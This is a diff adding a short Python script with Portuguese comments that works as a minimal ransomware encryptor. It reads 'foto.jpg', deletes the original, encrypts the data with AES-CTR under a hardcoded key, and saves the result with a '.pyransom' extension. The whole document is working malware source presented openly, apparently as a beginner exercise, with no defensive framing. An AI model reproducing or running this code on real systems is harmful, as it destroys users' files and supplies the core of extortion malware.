@@ -1,0 +1,18 @@
+import os #SO
+import pyaes #Cripto 
+
+file_name ="foto.jpg" #arq img
+file = open(file_name, "rb") #abrir foto
+file_data = file.read() #salvando
+file.close() #fechando
+
+os.remove(file_name) #removendo arquivo
+
+key= "0143256879fravtr" #chave
+aes = pyaes.AESModeOfOperationCTR(key) #responsavel por critografar arq 
+crypto_data = aes.encrypt(file_data) #recebendo conteudo img (já criptografado)
+
+new_file_name = file_name + ".pyransom" #criando nova variavel para o arquivo
+new_file = open(new_file_name, "wb") #abrindo esse novo arquivo
+new_file.write(crypto_data) #criando novo arquivo criptografado
+new_file.close() #fechando arquivo
